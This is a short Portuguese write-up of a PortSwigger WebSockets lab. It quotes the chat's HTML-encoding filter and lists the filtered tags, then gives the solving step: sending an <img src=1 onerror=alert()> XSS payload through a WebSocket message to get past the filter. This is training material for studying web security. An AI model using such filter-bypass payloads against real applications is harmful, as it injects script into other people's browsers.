---
title: "PortSwigger - WebSockets"
author: "imendes"
date: 2026-01-18
subject: "PortSwigger Labs Walkthrough"
description: "Write-up técnico dos laboratórios de WebSockets da PortSwigger"
keywords: ["PortSwigger", "WebSockets", "Real-time", "Web Security", "XSS"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [PortSwigger]
---

## Lab: Manipulating the WebSocket handshake to exploit vulnerabilities
"This online shop has a live chat feature implemented using WebSockets.
It has an aggressive but flawed XSS filter.
To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser. "

Html filter:
```javascript
function htmlEncode(str) {
        if (chatForm.getAttribute("encode")) {
            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
                return lookup[c];
            });
        }
        return str;
    }
```
Em geral, filtra tags XSS e event handlers tipicos
ignores case and general. Affects us: `<` and `>`. 
Tags filtradas:
```
script
javascript
```
Faça uma conexão com o websocket de chat live e envie para o repeater.
envie a mensagem {"message":"\<img src=1 onerror=alert()>"}
